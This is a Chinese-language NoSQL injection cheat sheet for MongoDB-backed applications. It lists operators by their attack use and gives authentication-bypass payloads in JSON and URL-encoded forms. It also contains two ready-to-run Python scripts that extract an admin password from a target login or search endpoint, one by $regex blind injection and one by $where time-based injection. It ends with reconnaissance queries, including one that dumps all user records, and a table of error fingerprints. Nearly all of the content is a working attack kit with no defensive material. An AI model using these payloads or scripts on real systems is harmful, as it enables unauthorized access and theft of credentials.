# NoSQL 注入 Payload 速查与自动化脚本

## 操作符完整对照表

| 操作符 | 含义 | 注入用途 |
|--------|------|----------|
| `$ne` | 不等于 | 认证绕过（密码不等于空） |
| `$gt` | 大于 | 认证绕过（密码大于空字符串） |
| `$gte` | 大于等于 | 同上 |
| `$lt` | 小于 | 条件构造 |
| `$lte` | 小于等于 | 条件构造 |
| `$eq` | 等于 | 精确匹配 |
| `$in` | 在列表中 | 多值匹配 |
| `$nin` | 不在列表中 | 排除匹配 |
| `$regex` | 正则匹配 | 盲注数据提取 |
| `$exists` | 字段存在 | 绕过空值检查 |
| `$where` | JS 执行 | RCE/盲注 |
| `$not` | 逻辑非 | 双重否定绕过 |
| `$or` | 逻辑或 | 条件扩展 |
| `$and` | 逻辑与 | 条件组合 |
| `$nor` | 都不满足 | 条件取反 |
| `$elemMatch` | 数组元素匹配 | 数组字段注入 |
| `$size` | 数组长度 | 数组信息泄露 |
| `$type` | BSON 类型 | 类型探测 |

## 认证绕过 Payload 集

### JSON 格式

```json
// 基础绕过
{"username": "admin", "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}
{"username": "admin", "password": {"$exists": true}}

// 枚举所有用户
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// 正则匹配用户
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

// $or 条件注入
{"$or": [{"username": "admin"}, {"username": "root"}], "password": {"$ne": ""}}

// $in 列表匹配
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}}

// 嵌套 $not
{"username": "admin", "password": {"$not": {"$eq": "definitely_wrong_password"}}}

// $type 绕过（密码不是字符串 2 → 比较失败但查询成功）
{"username": "admin", "password": {"$type": 1}}
```

### URL 编码格式

```
username=admin&password[$ne]=
username=admin&password[$gt]=
username=admin&password[$exists]=true
username[$ne]=&password[$ne]=
username[$regex]=.*&password[$regex]=.*
username=admin&password[$not][$eq]=xxx
username[$in][0]=admin&username[$in][1]=root&password[$ne]=
```

## $regex 盲注自动化脚本

```python
#!/usr/bin/env python3
"""NoSQL $regex 盲注提取器"""
import requests
import string

URL = "http://TARGET/api/login"
CHARSET = string.ascii_lowercase + string.digits + string.punctuation
FIELD = "password"  # 要提取的字段

def check(regex_pattern):
    """发送注入请求，返回是否匹配"""
    payload = {
        "username": "admin",
        FIELD: {"$regex": f"^{regex_pattern}"}
    }
    r = requests.post(URL, json=payload)
    # 根据实际响应调整判断条件
    return r.status_code == 200 or "success" in r.text.lower()

def extract():
    """逐字符提取"""
    result = ""
    while True:
        found = False
        for c in CHARSET:
            # 转义正则特殊字符
            escaped = c if c.isalnum() else f"\\{c}"
            if check(result + escaped):
                result += c
                print(f"[+] Found: {result}")
                found = True
                break
        if not found:
            break
    return result

if __name__ == "__main__":
    print(f"[*] Extracting {FIELD} for user 'admin'...")
    value = extract()
    print(f"[+] Final value: {value}")
```

## $where 时间盲注脚本

```python
#!/usr/bin/env python3
"""MongoDB $where 时间盲注"""
import requests
import time
import string

URL = "http://TARGET/api/search"
DELAY = 2  # 秒

def check_char(position, char):
    """通过时间延迟判断字符"""
    escaped = char.replace("'", "\\'")
    payload = {
        "$where": f"if(this.password[{position}]=='{escaped}'){{sleep({DELAY*1000});return true;}}return false;"
    }
    start = time.time()
    try:
        requests.post(URL, json=payload, timeout=DELAY+3)
    except requests.Timeout:
        pass
    elapsed = time.time() - start
    return elapsed >= DELAY

def extract_password():
    result = ""
    for pos in range(50):
        found = False
        for c in string.printable[:95]:
            if check_char(pos, c):
                result += c
                print(f"[+] Position {pos}: {c} → {result}")
                found = True
                break
        if not found:
            break
    return result

if __name__ == "__main__":
    print("[*] Starting $where time-based blind extraction...")
    pwd = extract_password()
    print(f"[+] Extracted: {pwd}")
```

## MongoDB 信息收集查询

```javascript
// 获取当前数据库名
db.getName()

// 列出所有集合
db.getCollectionNames()

// 列出所有数据库
db.adminCommand('listDatabases')

// 查看用户表结构（取第一条记录）
db.users.findOne()

// 导出所有用户数据
db.users.find().toArray()

// 检查 MongoDB 版本（决定 $where 是否可用）
db.version()

// 检查当前用户权限
db.runCommand({connectionStatus: 1})
```

## 常见 MongoDB 错误信息指纹

| 错误信息 | 含义 |
|----------|------|
| `MongoError: bad query` | 查询语法错误，确认 MongoDB |
| `CastError: Cast to ObjectId failed` | ObjectId 格式错误 |
| `BSONTypeError` | BSON 类型不匹配 |
| `MongoServerError: unknown operator` | 操作符被过滤或不支持 |
| `Cannot apply $regex modifier` | regex 注入被部分过滤 |
| `$where is not allowed` | $where 被禁用（MongoDB 5.0+） |
| `Executor error during find command` | 查询执行错误 |
